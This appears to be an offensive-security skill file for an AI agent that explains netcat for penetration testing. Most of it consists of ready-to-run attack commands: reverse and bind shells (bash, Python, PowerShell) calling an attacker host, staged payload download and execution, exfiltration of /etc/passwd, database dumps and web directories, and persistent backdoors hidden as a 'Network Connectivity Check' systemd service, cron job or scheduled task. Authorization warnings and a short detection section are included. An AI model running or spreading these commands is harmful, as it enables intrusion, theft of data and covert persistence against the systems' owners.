---
name: network-netcat
description: >
  Network utility for reading and writing data across TCP/UDP connections, port scanning, file
  transfers, and backdoor communication channels. Use when: (1) Testing network connectivity and
  port availability, (2) Creating reverse shells and bind shells for authorized penetration testing,
  (3) Transferring files between systems in restricted environments, (4) Banner grabbing and service
  enumeration, (5) Establishing covert communication channels, (6) Testing firewall rules and network
  segmentation.
version: 0.1.0
maintainer: sirappsec@gmail.com
category: offsec
tags: [networking, netcat, reverse-shell, file-transfer, port-scanning, banner-grabbing]
frameworks: [MITRE-ATT&CK, PTES]
dependencies:
  packages: [netcat, ncat]
references:
  - https://nmap.org/ncat/guide/index.html
  - https://attack.mitre.org/techniques/T1059/
---

# Netcat Network Utility

## Overview

Netcat (nc) is the "Swiss Army knife" of networking tools, providing simple Unix utility for reading and writing data across network connections. This skill covers authorized offensive security applications including reverse shells, bind shells, file transfers, port scanning, and banner grabbing.

**IMPORTANT**: Netcat capabilities can be used maliciously. Only use these techniques in authorized penetration testing environments with proper written permission.

## Quick Start

Basic connection and listening:

```bash
# Listen on port 4444
nc -lvnp 4444

# Connect to remote host
nc <target-ip> <port>

# Banner grab a service
echo "" | nc <target-ip> 80

# Simple port scan
nc -zv <target-ip> 1-1000
```

## Core Workflow

### Netcat Operations Workflow

Progress:
[ ] 1. Verify authorization for network testing
[ ] 2. Test basic connectivity and port availability
[ ] 3. Perform banner grabbing and service enumeration
[ ] 4. Establish reverse or bind shells (if authorized)
[ ] 5. Transfer files between systems
[ ] 6. Create relay and pivot connections
[ ] 7. Document findings and clean up connections
[ ] 8. Remove any backdoors or persistence mechanisms

Work through each step systematically. Check off completed items.

### 1. Authorization Verification

**CRITICAL**: Before any netcat operations:
- Confirm written authorization for network testing
- Verify in-scope targets and allowed activities
- Understand restrictions on shell access and data exfiltration
- Document emergency contact procedures
- Confirm cleanup requirements post-engagement

### 2. Basic Connectivity Testing

Test network connectivity and port availability:

```bash
# TCP connection test
nc -vz <target-ip> <port>

# UDP connection test
nc -uvz <target-ip> <port>

# Test port range
nc -zv <target-ip> 20-30

# Verbose output
nc -v <target-ip> <port>
```

**Connection test results**:
- **Connection succeeded**: Port is open and accepting connections
- **Connection refused**: Port is closed
- **Connection timeout**: Port is filtered by firewall or no response

### 3. Banner Grabbing

Extract service banner information:

```bash
# HTTP banner grab
echo -e "GET / HTTP/1.0\r\n\r\n" | nc <target-ip> 80

# SMTP banner grab
echo "QUIT" | nc <target-ip> 25

# FTP banner grab
echo "QUIT" | nc <target-ip> 21

# SSH banner grab
nc <target-ip> 22

# Generic banner grab with timeout
timeout 2 nc <target-ip> <port>
```

**Service-specific banner grabbing**:

```bash
# MySQL banner
nc <target-ip> 3306

# PostgreSQL banner
nc <target-ip> 5432

# SMB/CIFS banner
nc <target-ip> 445

# RDP banner
nc <target-ip> 3389
```

### 4. Port Scanning

Simple port scanning (note: nmap is more comprehensive):

```bash
# Scan single port
nc -zv <target-ip> 80

# Scan port range
nc -zv <target-ip> 1-1000

# Scan specific ports
for port in 21 22 23 25 80 443 3389; do
  nc -zv <target-ip> $port 2>&1 | grep succeeded
done

# Fast UDP scan
nc -uzv <target-ip> 53,161,500
```

**Limitations of netcat port scanning**:
- Slower than dedicated port scanners
- Limited stealth capabilities
- No service version detection
- Better for quick ad-hoc testing

### 5. Reverse Shells (Authorized Testing Only)

Establish reverse shell connections from target to attacker:

**Attacker machine (listener)**:
```bash
# Start listener
nc -lvnp 4444

# With verbose output
nc -lvnp 4444 -v
```

**Target machine (connector)**:

```bash
# Linux reverse shell
nc <attacker-ip> 4444 -e /bin/bash

# If -e not available (OpenBSD netcat)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <attacker-ip> 4444 > /tmp/f

# Python reverse shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker-ip>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Bash reverse shell
bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1

# Windows reverse shell (with ncat)
ncat.exe <attacker-ip> 4444 -e cmd.exe

# PowerShell reverse shell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<attacker-ip>',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

**Upgrade reverse shell to interactive TTY**:

```bash
# Python PTY upgrade
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Background shell with Ctrl+Z, then:
stty raw -echo; fg
export TERM=xterm
export SHELL=/bin/bash
```

### 6. Bind Shells (Authorized Testing Only)

Create listening shell on target machine:

**Target machine (listener with shell)**:
```bash
# Linux bind shell
nc -lvnp 4444 -e /bin/bash

# Without -e flag
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -lvnp 4444 > /tmp/f

# Windows bind shell
ncat.exe -lvnp 4444 -e cmd.exe
```

**Attacker machine (connect to bind shell)**:
```bash
nc <target-ip> 4444
```

**Bind shell vs Reverse shell**:
- **Bind Shell**: Target listens, attacker connects (blocked by outbound firewalls)
- **Reverse Shell**: Attacker listens, target connects (bypasses inbound firewall rules)

### 7. File Transfers

Transfer files between systems:

**Receiving file (listener)**:
```bash
# Receive file on port 5555
nc -lvnp 5555 > received_file.txt
```

**Sending file (connector)**:
```bash
# Send file to listener
nc <receiver-ip> 5555 < file_to_send.txt

# With progress indication
pv file_to_send.txt | nc <receiver-ip> 5555
```

**Directory/archive transfer**:

```bash
# Sender: tar and compress directory, send via netcat
tar czf - /path/to/directory | nc <receiver-ip> 5555

# Receiver: receive and extract
nc -lvnp 5555 | tar xzf -
```

**Large file transfer with verification**:

```bash
# Sender: calculate checksum before sending
md5sum large_file.iso
cat large_file.iso | nc <receiver-ip> 5555

# Receiver: receive and verify
nc -lvnp 5555 > large_file.iso
md5sum large_file.iso
```

### 8. Encrypted File Transfer

Use ncat with SSL for encrypted transfers:

```bash
# Receiver with SSL
ncat -lvnp 5555 --ssl > received_file.txt

# Sender with SSL
ncat <receiver-ip> 5555 --ssl < file_to_send.txt

# Generate self-signed certificate for ncat
openssl req -new -x509 -days 365 -nodes -out cert.pem -keyout cert.key
ncat -lvnp 5555 --ssl --ssl-cert cert.pem --ssl-key cert.key
```

### 9. Relay and Pivoting

Create relay connections through compromised hosts:

```bash
# Simple relay: forward connections from port 8080 to internal host
mkfifo backpipe
nc -lvnp 8080 0<backpipe | nc <internal-target-ip> 80 1>backpipe

# Two-way relay
nc -lvnp 8080 -c "nc <internal-target-ip> 80"

# Use ncat for more reliable relay
ncat -lvnp 8080 --sh-exec "ncat <internal-target-ip> 80"
```

**Pivot chain example**:

```bash
# Compromised Host A (DMZ): relay to internal network
nc -lvnp 9090 -c "nc 192.168.1.100 3389"

# Attacker: connect through pivot
nc <compromised-host-a> 9090
```

### 10. Chat and Communication

Simple chat server for covert communication:

```bash
# Host 1 (listener)
nc -lvnp 6666

# Host 2 (connector)
nc <host1-ip> 6666
```

**Two-way communication**: Both parties can type and messages appear on both sides.

## Security Considerations

### Authorization & Legal Compliance

- **Written Permission**: Obtain explicit authorization for all netcat operations
- **Shell Access**: Reverse/bind shells are invasive, require clear authorization
- **Data Exfiltration**: File transfers may trigger DLP alerts
- **Covert Channels**: Relay connections can bypass security controls
- **Cleanup**: Remove all shells, listeners, and backdoors post-engagement

### Operational Security

- **Encryption**: Use ncat with --ssl for encrypted connections
- **Logging**: Netcat leaves minimal forensic artifacts but connections are logged
- **Detection**: IDS/IPS may detect common reverse shell patterns
- **Egress Filtering**: Outbound connections may be blocked
- **Port Selection**: Use common ports (80, 443, 53) to blend with normal traffic

### Audit Logging

Document all netcat activities:
- Connection timestamps and duration
- Source and destination IP addresses and ports
- Type of operation (shell, file transfer, relay)
- Commands executed through shells
- Files transferred
- Any errors or connection failures

### Compliance

- **MITRE ATT&CK**:
  - T1059.004 (Unix Shell)
  - T1071.001 (Web Protocols)
  - T1090 (Proxy/Multi-hop Proxy)
  - T1105 (Ingress Tool Transfer)
- **PTES**: Exploitation and post-exploitation phases
- **OWASP**: Command injection testing methodology

## Common Patterns

### Pattern 1: Web Server Vulnerability Validation

```bash
# Test for command injection vulnerability
echo -e "GET /?cmd=id HTTP/1.0\r\n\r\n" | nc <target-ip> 80

# SQL injection parameter testing
echo -e "GET /page?id=1' OR '1'='1 HTTP/1.0\r\n\r\n" | nc <target-ip> 80

# Test HTTP methods
echo -e "OPTIONS / HTTP/1.0\r\n\r\n" | nc <target-ip> 80
```

### Pattern 2: Multi-stage Payload Delivery

```bash
# Stage 1: Attacker listener
nc -lvnp 4444 > stage2_payload.sh

# Stage 2: Target downloads next stage
nc <attacker-ip> 4444 < /dev/null > /tmp/stage2.sh
chmod +x /tmp/stage2.sh
/tmp/stage2.sh

# Stage 3: Execute downloaded payload
# (payload establishes full reverse shell)
```

### Pattern 3: Data Exfiltration

```bash
# Exfiltrate sensitive files
cat /etc/passwd | nc <attacker-ip> 5555

# Exfiltrate database dump
mysqldump -u root -p database_name | nc <attacker-ip> 5555

# Compress and exfiltrate directory
tar czf - /var/www/html | nc <attacker-ip> 5555

# Receiver
nc -lvnp 5555 > exfiltrated_data.tar.gz
```

### Pattern 4: Persistent Backdoor (Authorized Testing)

```bash
# Create systemd service for persistence (Linux)
cat > /etc/systemd/system/netcat-backdoor.service <<EOF
[Unit]
Description=Network Connectivity Check
After=network.target

[Service]
Type=simple
ExecStart=/bin/nc <attacker-ip> 4444 -e /bin/bash
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF

systemctl enable netcat-backdoor.service
systemctl start netcat-backdoor.service

# Cron-based persistence
(crontab -l; echo "@reboot /bin/nc <attacker-ip> 4444 -e /bin/bash") | crontab -

# Windows scheduled task
schtasks /create /tn "NetworkCheck" /tr "C:\ncat.exe <attacker-ip> 4444 -e cmd.exe" /sc onstart /ru System
```

## Integration Points

### Metasploit Integration

Use netcat as post-exploitation utility:

```bash
# Metasploit session backgrounding and netcat shell
meterpreter > execute -f nc -a "<attacker-ip> 4444 -e /bin/bash"

# Upload netcat to target
meterpreter > upload /usr/bin/nc /tmp/nc
meterpreter > shell
sh-4.2$ /tmp/nc <attacker-ip> 5555 -e /bin/bash
```

### Scripting and Automation

```bash
#!/bin/bash
# automated_shell_catcher.sh - Automatic reverse shell handler

PORT=4444
LOG_DIR="shells/$(date +%Y%m%d)"
mkdir -p "$LOG_DIR"

while true; do
  TIMESTAMP=$(date +%H%M%S)
  echo "[*] Listening on port $PORT..."
  nc -lvnp $PORT | tee "$LOG_DIR/shell_$TIMESTAMP.log"
  echo "[*] Connection closed, restarting listener..."
  sleep 2
done
```

## Troubleshooting

### Issue: "nc: command not found"

**Solutions**:
```bash
# Install netcat (Ubuntu/Debian)
sudo apt-get install netcat-traditional
sudo apt-get install netcat-openbsd

# Install ncat (Nmap project, more features)
sudo apt-get install ncat

# Check available version
which nc ncat netcat
```

### Issue: "-e flag not supported"

**Solution**: Use alternative technique with named pipes:

```bash
# Linux reverse shell without -e
rm /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <attacker-ip> 4444 > /tmp/f

# Or use ncat which supports -e
ncat <attacker-ip> 4444 -e /bin/bash
```

### Issue: Connection Dies Immediately

**Causes**:
- Firewall blocking connection
- No interactive prompt keeping connection alive
- Process killed by security software

**Solutions**:
```bash
# Keep connection alive with while loop
while true; do nc <attacker-ip> 4444 -e /bin/bash; sleep 10; done

# Use ncat with keep-alive
ncat -lvnp 4444 --keep-open

# Add reconnection logic
while true; do nc <attacker-ip> 4444 -e /bin/bash 2>/dev/null; sleep 60; done
```

### Issue: Can't Get Interactive Shell

**Solutions**:
```bash
# Upgrade to PTY shell
python -c 'import pty; pty.spawn("/bin/bash")'

# Set terminal type
export TERM=xterm

# Enable raw mode (for Ctrl+C, etc.)
# On attacker machine, background shell with Ctrl+Z:
stty raw -echo; fg
```

## Defensive Considerations

Organizations can detect netcat activity by:

- **Process Monitoring**: Detect nc/ncat process execution
- **Network Monitoring**: Unusual outbound connections to non-standard ports
- **Command-Line Auditing**: Monitor for -e flag usage
- **Traffic Analysis**: Unencrypted shell traffic patterns
- **File Integrity**: Detect unauthorized netcat binaries

Enhance defensive posture:
- Block outbound connections to non-business ports
- Monitor for process execution from unusual locations
- Deploy EDR solutions to detect reverse shell patterns
- Enable egress filtering on firewalls
- Audit Sysmon Event ID 1 (Process Creation) for nc/ncat
- Detect named pipe creation (Linux: mkfifo)
- Monitor cron jobs and systemd services for suspicious entries

## References

- [Ncat Users' Guide](https://nmap.org/ncat/guide/index.html)
- [GTFOBins: netcat](https://gtfobins.github.io/gtfobins/nc/)
- [MITRE ATT&CK: Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/)
- [PTES: Post Exploitation](http://www.pentest-standard.org/index.php/Post_Exploitation)
- [Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
